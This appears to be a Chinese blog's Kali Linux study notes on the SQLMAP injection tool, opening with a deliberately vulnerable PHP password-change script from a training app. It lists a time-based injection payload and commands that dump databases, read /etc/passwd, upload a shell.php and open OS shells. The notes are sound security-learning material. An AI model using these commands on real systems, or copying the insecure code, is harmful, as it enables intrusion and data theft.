<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">            </span><br><span class="line">    if (isset($_GET[&apos;Change&apos;])) &#123;</span><br><span class="line">    </span><br><span class="line">        // Turn requests into variables</span><br><span class="line">        $pass_curr = $_GET[&apos;password_current&apos;];</span><br><span class="line">        $pass_new = $_GET[&apos;password_new&apos;];</span><br><span class="line">        $pass_conf = $_GET[&apos;password_conf&apos;];</span><br><span class="line"></span><br><span class="line">        // Sanitise current password input</span><br><span class="line">        $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">        $pass_curr = mysql_real_escape_string( $pass_curr );</span><br><span class="line">        $pass_curr = md5( $pass_curr );</span><br><span class="line">        </span><br><span class="line">        // Check that the current password is correct</span><br><span class="line">        $qry = &quot;SELECT password FROM `users` WHERE user=&apos;admin&apos; AND password=&apos;$pass_curr&apos;;&quot;;</span><br><span class="line">        $result = mysql_query($qry) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">        if (($pass_new == $pass_conf) &amp;&amp; ( $result &amp;&amp; mysql_num_rows( $result ) == 1 ))&#123;</span><br><span class="line">            $pass_new = mysql_real_escape_string($pass_new);</span><br><span class="line">            $pass_new = md5($pass_new);</span><br><span class="line"></span><br><span class="line">            $insert=&quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;admin&apos;;&quot;;</span><br><span class="line">            $result=mysql_query($insert) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">                        </span><br><span class="line">            echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        </span><br><span class="line">            mysql_close();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        else&#123;        </span><br><span class="line">            echo &quot;&lt;pre&gt; Passwords did not match or current password incorrect. &lt;/pre&gt;&quot;;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%80)%EF%BC%9ASQLMAP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%80)%EF%BC%9ASQLMAP/" itemprop="url">Kali Linux笔记(五十一)：SQLMAP</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-15T14:12:52+08:00">
                2020-01-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-SQLMAP自动注入"><a href="#1-SQLMAP自动注入" class="headerlink" title="1. SQLMAP自动注入"></a>1. SQLMAP自动注入</h4><ul>
<li>开源sql注入漏洞检测、利用工具（python语言开发）</li>
<li>检测动态页面中get/post参数、cookie、http头</li>
<li>数据榨取</li>
<li>文件系统访问</li>
<li>操作系统命令执行</li>
<li>引擎强大、特性丰富</li>
<li>XSS漏洞检测</li>
</ul>
<blockquote>
<pre><code>⭐WEB渗透需要深入掌握SQL漏洞的原理以及注入</code></pre></blockquote>
<h4 id="2-SQLMAP–检测技术"><a href="#2-SQLMAP–检测技术" class="headerlink" title="2. SQLMAP–检测技术"></a>2. SQLMAP–检测技术</h4><ul>
<li>基于布尔的盲注检测（真/假）</li>
<li>基于时间的盲注检测（响应时间长短）<ul>
<li>‘and (select * from (select(sleep(20)))a)–+</li>
</ul>
</li>
<li>基于错误的检测</li>
<li>基于UNION联合查询的检测<ul>
<li>适用于通过循环直接输出联合查询结果，否则只显示第一项结果</li>
</ul>
</li>
<li>基于堆叠查询的检测<ul>
<li>;堆叠多个查询语句</li>
<li>适用于非select的数据修改、删除操作</li>
</ul>
</li>
<li>支持的数据库管理系统DBMS<ul>
<li>MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐NOSQLMAP可以查询NOSQL数据库里面的类型（非关系型数据库）</code></pre></blockquote>
<h4 id="3-SQLMAP–其他特性"><a href="#3-SQLMAP–其他特性" class="headerlink" title="3. SQLMAP–其他特性"></a>3. SQLMAP–其他特性</h4><ul>
<li>数据库直接连接-d<ul>
<li>不通过SQL注入，制定身份认证信息、IP、端口（Orcal 121，SQL Server 3433）</li>
</ul>
</li>
<li>与burpsuite、google结合使用，支持政策表达式限定测试目标</li>
<li>Get、Post、Cookie、Referer、User-Agent（随机或指定目标）<ul>
<li>Cookie过期后自动处理Set-Cookie头，更新Cookie信息（SQLMAP自动探测）</li>
</ul>
</li>
<li>限制：最大并发，延迟发送</li>
<li>支持Basic、Digest、NTLM、客户端CA身份认证（软证书+pin码，对客户端的身份认证）</li>
<li>数据库版本、用户、权限、hash枚举和字典破解、暴力破解表列名称（无法进行union select）</li>
<li>文件上传下载、UDF、启动并执行存储过程、操作系统命令执行、访问windows注册表</li>
<li>与w3af、metasploit集成结合使用，基于数据库服务进程提权和上传执行后门</li>
</ul>
<h4 id="4-SQLMAP–安装与更新"><a href="#4-SQLMAP–安装与更新" class="headerlink" title="4. SQLMAP–安装与更新"></a>4. SQLMAP–安装与更新</h4><ul>
<li>基于python2.7开发</li>
<li>安装<ul>
<li><strong><code>🔺命令：apt-get install git</code></strong></li>
<li><strong><code>🔺命令：git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></strong></li>
</ul>
</li>
<li>升级<ul>
<li><strong><code>🔺命令：sqlmap --update</code></strong> 在线</li>
<li><strong><code>🔺命令：git pull</code></strong> 离线</li>
</ul>
</li>
<li>Kali集成版随Kali库更新（Kali rolling版本可以直接通过update、upgrade）</li>
</ul>
<blockquote>
<pre><code>⭐Kali集成版更新（▲ 2020.1.15 更新可能在bash中找不到sqlmap）
1.git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
2.sqlmap --update</code></pre></blockquote>
<h4 id="5-SQLMAP–Options-Target参数"><a href="#5-SQLMAP–Options-Target参数" class="headerlink" title="5. SQLMAP–Options/Target参数"></a>5. SQLMAP–Options/Target参数</h4><ul>
<li>Options<ul>
<li>-h（显示粗略信息)</li>
<li>-hh（显示详细信息）</li>
<li>–version（SQLMAP版本信息）</li>
<li>-v （版本信息，分为0-5级，默认为1级）</li>
</ul>
</li>
<li>Target<ul>
<li>-d（直接连接，作为数据库的客户端）</li>
<li>-u（URL地址，需要有变量名称）</li>
<li>-l（log file记录日志，可以来自Burp or webscarab）</li>
<li>-x（站点地图，可以提交以xml文件的形式）</li>
<li>-m（url地址表，多个url地址保存为文本文件）</li>
<li>-r（http头请求信息提交，保存http头请求信息）</li>
<li>-g（Google搜索引擎，正则表达式）</li>
<li>-c（配置文件，保存扫描的配置文件）</li>
</ul>
</li>
</ul>
<h4 id="6-SQLMAP–Target-→-直接连接"><a href="#6-SQLMAP–Target-→-直接连接" class="headerlink" title="6. SQLMAP–Target → 直接连接"></a>6. SQLMAP–Target → 直接连接</h4><ul>
<li>直接方法<ul>
<li>sqlmap -d “mysql://user:<a href="mailto:password@192.168.1.1" target="_blank" rel="noopener">password@192.168.1.1</a>:3306/dvwa”</li>
<li>–users（数据库的管理账号）</li>
<li>–banner（目标系统版本，数据库类型版本）</li>
<li>–dbs（查询目标数据库管理系统的库）</li>
<li>–schema（源数据库）</li>
<li>-a（所有数据信息）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐查询结果，默认保存在：/root/.sqlmap/output/中</code></pre></blockquote>
<h4 id="7-SQLMAP–Target-→-Get方法"><a href="#7-SQLMAP–Target-→-Get方法" class="headerlink" title="7. SQLMAP–Target → Get方法"></a>7. SQLMAP–Target → Get方法</h4><ul>
<li>Get方法<ul>
<li>sqlmap -u “<a href="http://1.1.1.1/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=22&amp;user-info-php-submit-button=View+Account+Datails&quot;" target="_blank" rel="noopener">http://1.1.1.1/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=22&amp;user-info-php-submit-button=View+Account+Datails&quot;</a> -p（只检查） username -f（数据库的指纹）</li>
<li><ul>
<li>–users（数据库的管理账号）</li>
</ul>
</li>
<li>–banner（目标系统版本，数据库类型版本）</li>
<li>–dbs（查询目标数据库管理系统的库）</li>
<li>–schema（源数据库）</li>
<li>-a（所有数据信息）</li>
</ul>
</li>
</ul>
<h4 id="8-SQLMAP–Target-→-扫描URL列表文件"><a href="#8-SQLMAP–Target-→-扫描URL列表文件" class="headerlink" title="8. SQLMAP–Target → 扫描URL列表文件"></a>8. SQLMAP–Target → 扫描URL列表文件</h4><ul>
<li>扫描URL列表文件<ul>
<li><a href="http://1.1.1.1/vuln1.php?q=foobar" target="_blank" rel="noopener">http://1.1.1.1/vuln1.php?q=foobar</a></li>
<li><a href="http://1.1.1.1/vuln3/id/1" target="_blank" rel="noopener">http://1.1.1.1/vuln3/id/1</a>*</li>
<li>sqlmap -m list.txt</li>
</ul>
</li>
</ul>
<h4 id="9-SQLMAP–Target-→-扫描Google搜索结果"><a href="#9-SQLMAP–Target-→-扫描Google搜索结果" class="headerlink" title="9. SQLMAP–Target → 扫描Google搜索结果"></a>9. SQLMAP–Target → 扫描Google搜索结果</h4><ul>
<li>扫描Google搜索结果（需要代理链，配置才能使用）<ul>
<li>sqlmap.py -g “inurl:&quot;.php?id=1&quot;“</li>
</ul>
</li>
</ul>
<h4 id="10-SQLMAP–Target-→-POST方法"><a href="#10-SQLMAP–Target-→-POST方法" class="headerlink" title="10. SQLMAP–Target → POST方法"></a>10. SQLMAP–Target → POST方法</h4><ul>
<li>使用http请求文件（burpsuite）<ul>
<li>使用Burp，设置浏览器代理，POST提交数据的登录形式</li>
<li>复制http请求头，gedit黏贴在新建request.txt中</li>
<li>sqlmap -r request.txt（通过Burp抓取请求的文件）</li>
</ul>
</li>
<li>使用burpsuite log文件<ul>
<li>Options → Misc → Project Logging → Proxy Requests</li>
<li>保存为log.txt，发送Http请求（关闭Intercept）</li>
<li>sqlmap -l log.txt</li>
</ul>
</li>
</ul>
<h4 id="11-SQLMAP–Target-→-HTTPS"><a href="#11-SQLMAP–Target-→-HTTPS" class="headerlink" title="11. SQLMAP–Target → HTTPS"></a>11. SQLMAP–Target → HTTPS</h4><ul>
<li>sqlmap -u “<a href="https://1.1.1.1/a.php?id=1:8843&quot;" target="_blank" rel="noopener">https://1.1.1.1/a.php?id=1:8843&quot;</a> –force-ssl</li>
</ul>
<h4 id="12-SQLMAP–Target-→-扫描配置文件"><a href="#12-SQLMAP–Target-→-扫描配置文件" class="headerlink" title="12. SQLMAP–Target → 扫描配置文件"></a>12. SQLMAP–Target → 扫描配置文件</h4><ul>
<li>查找sqlmap.conf（/etc/sqlmap/sqlmap.conf）</li>
<li>sqlmap -c sqlmap.conf</li>
</ul>
<h4 id="13-SQLMAP–REQUEST-→-数据段"><a href="#13-SQLMAP–REQUEST-→-数据段" class="headerlink" title="13. SQLMAP–REQUEST → 数据段"></a>13. SQLMAP–REQUEST → 数据段</h4><ul>
<li>数据段： –data<ul>
<li>get/post都适用</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> –data=”user=1&amp;pass=2（get的url参数部分/post的源代码）” -f</li>
</ul>
</li>
</ul>
<h4 id="14-SQLMAP–REQUEST-→-变量分隔符"><a href="#14-SQLMAP–REQUEST-→-变量分隔符" class="headerlink" title="14. SQLMAP–REQUEST → 变量分隔符"></a>14. SQLMAP–REQUEST → 变量分隔符</h4><ul>
<li>变量分隔符： –param-del<ul>
<li><a href="http://1.1.1.1/a.php?q=foo;id=1" target="_blank" rel="noopener">http://1.1.1.1/a.php?q=foo;id=1</a>  //  ;  &amp;</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> –data=”q=foo;id=1” –param-del=”;” -f</li>
</ul>
</li>
</ul>
<h4 id="15-SQLMAP–REQUEST-→-Cookie头"><a href="#15-SQLMAP–REQUEST-→-Cookie头" class="headerlink" title="15.SQLMAP–REQUEST → Cookie头"></a>15.SQLMAP–REQUEST → Cookie头</h4><ul>
<li>–cookie</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=12&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=12&quot;</a> –cookie=”a=1；b=2（Cooke的值）” -f </li>
<li>web应用需要基于cookie的身份认证</li>
<li>检查存在cookie中的注入点（sqlmap自动测试）</li>
<li>Set-Cookie/–drop-set-cookie</li>
</ul>
<blockquote>
<pre><code>⭐SQLMAP扫描的Level1不会扫描cookie中存在的漏洞，至少得从Level2开始，--level 2</code></pre></blockquote>
<h4 id="16-SQLMAP–REQUEST-→-Agent"><a href="#16-SQLMAP–REQUEST-→-Agent" class="headerlink" title="16. SQLMAP–REQUEST → Agent"></a>16. SQLMAP–REQUEST → Agent</h4><ul>
<li>–user-agent<ul>
<li>sqlmap/1.0-dev-xxxxxxxx(<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a>)</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –user-agent=”aaaaaa” –dbs</li>
</ul>
</li>
<li>–random-agent<ul>
<li>/usr/share/sqlmap/txt/yser-agents.txt</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –random-agent –dbs</li>
</ul>
</li>
<li>sqlmap检查user-agent中的注入点：Level&gt;=3</li>
<li>APP/WAF/IPS/IDS过滤异常user-agent时报错<ul>
<li>[hh:mm:20][ERROR] the target URL responded with an unknown HTTP status code,try to force the HTTP User-Agent header with option –useragent or –random-agent</li>
</ul>
</li>
</ul>
<h4 id="17-SQLMAP–REQUEST-→-Host-Referer-额外的header"><a href="#17-SQLMAP–REQUEST-→-Host-Referer-额外的header" class="headerlink" title="17. SQLMAP–REQUEST → Host/Referer/额外的header"></a>17. SQLMAP–REQUEST → Host/Referer/额外的header</h4><ul>
<li>Host头：–host<ul>
<li>Level=5</li>
</ul>
</li>
<li>Referer头：–referer<ul>
<li>Level&gt;=3</li>
</ul>
</li>
<li>额外的header：–headers<ul>
<li>每个头单独一行（名称区分大小写，大小写敏感）</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –headers=”Host:<a href="http://www.a.com\nUser-Agent:yuanfh&quot;" target="_blank" rel="noopener">www.a.com\nUser-Agent:yuanfh&quot;</a></li>
</ul>
</li>
<li>–method=GET/POST（发送请求的方法，指定请求方法）</li>
</ul>
<h4 id="18-SQLMAP–REQUEST-→-基于HTTP协议的身份验证"><a href="#18-SQLMAP–REQUEST-→-基于HTTP协议的身份验证" class="headerlink" title="18. SQLMAP–REQUEST → 基于HTTP协议的身份验证"></a>18. SQLMAP–REQUEST → 基于HTTP协议的身份验证</h4><ul>
<li>基于HTTP协议的身份验证<ul>
<li>Basic</li>
<li>Digest</li>
<li>NTLM</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –auth-type Basic –auth-cred “user:pass”</li>
</ul>
</li>
<li>–auth-cert/–auth-file（基于客户端证书的身份认证）<ul>
<li>–auth-file=”ca.PEM”</li>
<li>含有私钥的PEM格式证书文件</li>
<li>PEM格式的证书链文件</li>
</ul>
</li>
</ul>
<h4 id="19-SQLMAP–REQUEST-→-http-s-代理"><a href="#19-SQLMAP–REQUEST-→-http-s-代理" class="headerlink" title="19. SQLMAP–REQUEST → http(s)代理"></a>19. SQLMAP–REQUEST → http(s)代理</h4><ul>
<li>http(s)代理（搜索引起：inurl:.php?id=）<ul>
<li>–proxy=”<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a></li>
<li>–proxy=”socks5://127.0.0.1:8087”</li>
<li>–proxy-cred=”name:pass”（代理的身份认证）</li>
<li>–ignore-proxy（忽略系统级代理设置，通常用于扫描本地网络目标）</li>
</ul>
</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –proxy=”<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a> -f</li>
</ul>
<h4 id="20-SQLMAP–REQUEST-→-delay-timeout-retries-randomize"><a href="#20-SQLMAP–REQUEST-→-delay-timeout-retries-randomize" class="headerlink" title="20. SQLMAP–REQUEST → delay/timeout/retries/randomize"></a>20. SQLMAP–REQUEST → delay/timeout/retries/randomize</h4><ul>
<li>–delay<ul>
<li>每次http(s)请求之间的延迟时间，浮点数，单位为秒，默认无延迟</li>
</ul>
</li>
<li>–timeout<ul>
<li>请求超时时间，浮点数，默认为30秒</li>
</ul>
</li>
<li>–retries<ul>
<li>http(s)连接超时重试次数，默认为3秒</li>
</ul>
</li>
<li>–randomize<ul>
<li>长度、类型与原始值保持一致的前提下，指定每次请求随机取值的参数名</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=100&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=100&quot;</a> –randomize=”id”</li>
</ul>
</li>
</ul>
<h4 id="21-SQLMAP–REQUEST-→-scope-safe"><a href="#21-SQLMAP–REQUEST-→-scope-safe" class="headerlink" title="21. SQLMAP–REQUEST → scope/safe"></a>21. SQLMAP–REQUEST → scope/safe</h4><ul>
<li>–scope<ul>
<li>过滤日志内容，通过正则表达式筛选扫描对象</li>
<li>sqlmap -l burp.log –scope=”(www)?.target.(com|net|org)”</li>
<li>sqlmap -l 2.log –scope=”(19)?.168.20.(1|10|100)” –level 3 –dbs</li>
<li>▲ User-agent中的注入点</li>
</ul>
</li>
<li>–safe-url/–safe-freq（两个需同时使用）<ul>
<li>检测和盲注阶段会产生大量失败请求，服务器端可能因此销毁Session</li>
<li>每发送–safe-freq次注入请求后，发送一次正常请求</li>
</ul>
</li>
</ul>
<h4 id="22-SQLMAP–REQUEST-→-skip-urlencode-eval"><a href="#22-SQLMAP–REQUEST-→-skip-urlencode-eval" class="headerlink" title="22. SQLMAP–REQUEST → skip-urlencode/eval"></a>22. SQLMAP–REQUEST → skip-urlencode/eval</h4><ul>
<li>–skip-urlencode<ul>
<li>默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据</li>
</ul>
</li>
<li>–eval<ul>
<li>每次请求前执行指定的python代码</li>
<li>每次请求更改或增加新的参数值（时间依赖、其他参数值依赖）</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&amp;hash=&quot;=c4ca4238a0b923820dcc509a6f75849b&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&amp;hash=&quot;=c4ca4238a0b923820dcc509a6f75849b&quot;</a> –eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”</li>
</ul>
</li>
</ul>
<h4 id="23-SQLMAP–Optimization参数（性能优化）"><a href="#23-SQLMAP–Optimization参数（性能优化）" class="headerlink" title="23. SQLMAP–Optimization参数（性能优化）"></a>23. SQLMAP–Optimization参数（性能优化）</h4><ul>
<li>-o（开启所有参数的优化，除threads参数外）</li>
<li>–predict-output</li>
<li>–keep-alive</li>
<li>–null-connection</li>
<li>–threads=THREADS</li>
</ul>
<h4 id="24-SQLMAP–Optimization-→-predict-output"><a href="#24-SQLMAP–Optimization-→-predict-output" class="headerlink" title="24. SQLMAP–Optimization → predict-output"></a>24. SQLMAP–Optimization → predict-output</h4><ul>
<li>根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率</li>
<li>版本名、用户名、密码、Privileges、role、数据库名称、表名、列名</li>
<li>▲ 与–threads参数不兼容</li>
<li>统计表：/usr/share/sqlmap/txt/common-outputs.txt</li>
</ul>
<h4 id="25-SQLMAP–Optimization-→-Keep-alive"><a href="#25-SQLMAP–Optimization-→-Keep-alive" class="headerlink" title="25. SQLMAP–Optimization → Keep alive"></a>25. SQLMAP–Optimization → Keep alive</h4><ul>
<li>–keep alive</li>
<li>使用http(s)长连接，性能好</li>
<li>▲ 与–proxy参数不兼容</li>
<li>长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</li>
</ul>
<h4 id="26-SQLMAP–Optimization-→-null-connection"><a href="#26-SQLMAP–Optimization-→-null-connection" class="headerlink" title="26. SQLMAP–Optimization → null-connection"></a>26. SQLMAP–Optimization → null-connection</h4><ul>
<li>–null-connection</li>
<li>只获取相应页面的大小值，而非页面具体内容</li>
<li>通常用于盲注判断真/假，降低网络带宽消耗</li>
<li>▲ 与–text-only参数不兼容（基于页面内容的比较判断真/假）</li>
</ul>
<h4 id="27-SQLMAP–Optimization-→-threads"><a href="#27-SQLMAP–Optimization-→-threads" class="headerlink" title="27. SQLMAP–Optimization → threads"></a>27. SQLMAP–Optimization → threads</h4><ul>
<li>–threads=THREADS</li>
<li>最大并发线程</li>
<li>盲注时每个线程获取一个字符（每个线程7次请求），获取完成后线程结束</li>
<li>默认值为1，建议不要超过10，否则可能影响目标站点可用性</li>
<li>▲ 与–predict-output参数不兼容</li>
</ul>
<blockquote>
<pre><code>⭐7次请求即可以获取到一个ASCII码字符，即可打印字符为128个</code></pre></blockquote>
<h4 id="28-SQLMAP–ENUMERATION-→-枚举数据库数据"><a href="#28-SQLMAP–ENUMERATION-→-枚举数据库数据" class="headerlink" title="28. SQLMAP–ENUMERATION → 枚举数据库数据"></a>28. SQLMAP–ENUMERATION → 枚举数据库数据</h4><ul>
<li>–current-user（当前数据库管理系统账号）</li>
<li>–current-db（当前数据库管理系统的数据库）</li>
<li>–hostname（当前机器主机名）</li>
<li>–users（数据库管理系统所有账号）</li>
<li>–privileges -U username（CU当前账号）</li>
<li>–roles（数据库角色）</li>
<li>–dbs（数据库管理系统所有的数据库）</li>
<li>–tables、–colums、–exclude-sysdbs（排除系统库）</li>
<li>-D db（指定所使用的数据库）</li>
<li>-T table（指定所使用的数据表）</li>
<li>-C user –colusms（指定某个列）</li>
<li>–schema（表结构）–batch（批处理） –exclude-sysdbs 元数据（使用默认选项）</li>
<li>–count（表的行数）</li>
</ul>
<h4 id="29-SQLMAP–ENUMERATION-→-具体数据操作"><a href="#29-SQLMAP–ENUMERATION-→-具体数据操作" class="headerlink" title="29. SQLMAP–ENUMERATION → 具体数据操作"></a>29. SQLMAP–ENUMERATION → 具体数据操作</h4><ul>
<li>Dump数据<ul>
<li>–dump,-C,-T,-D,–start,–stop</li>
<li>–dump-all –exclude-sysdbs</li>
<li>–sql-query “select * from users”</li>
</ul>
</li>
</ul>
<h4 id="30-SQLMAP–BRUFE-FORCE（暴力破解）"><a href="#30-SQLMAP–BRUFE-FORCE（暴力破解）" class="headerlink" title="30. SQLMAP–BRUFE FORCE（暴力破解）"></a>30. SQLMAP–BRUFE FORCE（暴力破解）</h4><ul>
<li>Mysql&lt;5.0，没有information_schema库</li>
<li>Mysql&gt;=5.0，但无权读取information_schema库</li>
<li>微软的access数据库，默认无权读取MSysObjects库</li>
<li>–common-tables</li>
<li>–common-columns（Access系统表无列信息）</li>
</ul>
<h4 id="31-SQLMAP–UDF-INJECTION（用户自定义函数注入）"><a href="#31-SQLMAP–UDF-INJECTION（用户自定义函数注入）" class="headerlink" title="31. SQLMAP–UDF INJECTION（用户自定义函数注入）"></a>31. SQLMAP–UDF INJECTION（用户自定义函数注入）</h4><ul>
<li>–udf-inject,–share-lib<ul>
<li>编译共享库创建并上传至DB Server，以此生成UDF实现高级注入</li>
<li>Linux：shared object</li>
<li>Windows：DLL</li>
<li><a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857" target="_blank" rel="noopener">http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857</a></li>
</ul>
</li>
</ul>
<h4 id="32-SQLMAP–FILE-SYSTEM（文件系统）"><a href="#32-SQLMAP–FILE-SYSTEM（文件系统）" class="headerlink" title="32. SQLMAP–FILE SYSTEM（文件系统）"></a>32. SQLMAP–FILE SYSTEM（文件系统）</h4><ul>
<li>–file-read=”/etc/passwd”</li>
<li>–file-write=”shell.php” –file-dest=”/tmp/shell.php”</li>
</ul>
<h4 id="33-SQLMAP–OS（操作系统）（▲-2020-1-15命令执行无返回数据）"><a href="#33-SQLMAP–OS（操作系统）（▲-2020-1-15命令执行无返回数据）" class="headerlink" title="33. SQLMAP–OS（操作系统）（▲ 2020.1.15命令执行无返回数据）"></a>33. SQLMAP–OS（操作系统）（▲ 2020.1.15命令执行无返回数据）</h4><ul>
<li>–os-cmd id（执行一个命令）</li>
<li>–os-shell</li>
<li>–sql-shell</li>
<li>Mysql、postgresql<ul>
<li>上传共享库并生成sys_exec()、sys_eval()两个UDF</li>
</ul>
</li>
<li>Mssql<ul>
<li>xp_cmdshell存储过程（有就用，禁了启，没有建）</li>
</ul>
</li>
</ul>
<h4 id="34-SQLMAP–WINDOWS-REGISTORY（Windows）"><a href="#34-SQLMAP–WINDOWS-REGISTORY（Windows）" class="headerlink" title="34. SQLMAP–WINDOWS REGISTORY（Windows）"></a>34. SQLMAP–WINDOWS REGISTORY（Windows）</h4><ul>
<li>–reg-read</li>
<li>–reg-add</li>
<li>–reg-del</li>
<li>–reg-key、–reg-value、–reg-data、–reg-type</li>
<li>sqlmap –u=”<a href="http://1.1.1.1/a.aspx?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.aspx?id=1&quot;</a> –reg-add –regkey=”HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value=Test -reg-type=REG_SZ –reg-data=1</li>
</ul>
<h4 id="35-SQLMAP–GENERAL（一般性参数）"><a href="#35-SQLMAP–GENERAL（一般性参数）" class="headerlink" title="35. SQLMAP–GENERAL（一般性参数）"></a>35. SQLMAP–GENERAL（一般性参数）</h4><ul>
<li>-s（sqlite会话文件保存位置）</li>
<li>-t（记录流量文件保存位置）</li>
<li>–charset（强制字符编码）<ul>
<li>–charset=GBK</li>
</ul>
</li>
<li>–crawl（从起始位置爬站深度）<ul>
<li>–batch –crawl=3</li>
</ul>
</li>
<li>–csv-del（dump数据默认存于”,”分割的CSV文件，指定其他分隔符）<ul>
<li>–csv-del=”;”</li>
</ul>
</li>
<li>–dbms-cred（指定数据库账号）</li>
<li>–flush-session（清空session）</li>
<li>–force-ssl（https链接）</li>
<li>–fresh-queries（忽略session查询结果）</li>
<li>–hex（dump非ASCII码字符内容时，将其编码为16进制形式，收到后解码还原，防过滤）<ul>
<li>sqlmap -u “<a href="http://1.1.1.1/s.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/s.php?id=1&quot;</a> –hex -v 3</li>
</ul>
</li>
<li>–output-dir=/tmp</li>
<li>–parse-errors（分析和现实数据库内建报错信息）<ul>
<li>sqlmap -u “<a href="http://1.1.1.1/sqlmap/a.asp?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/sqlmap/a.asp?id=1&quot;</a> –parse-errors</li>
</ul>
</li>
<li>–save（将命令保存成配置文件）</li>
</ul>
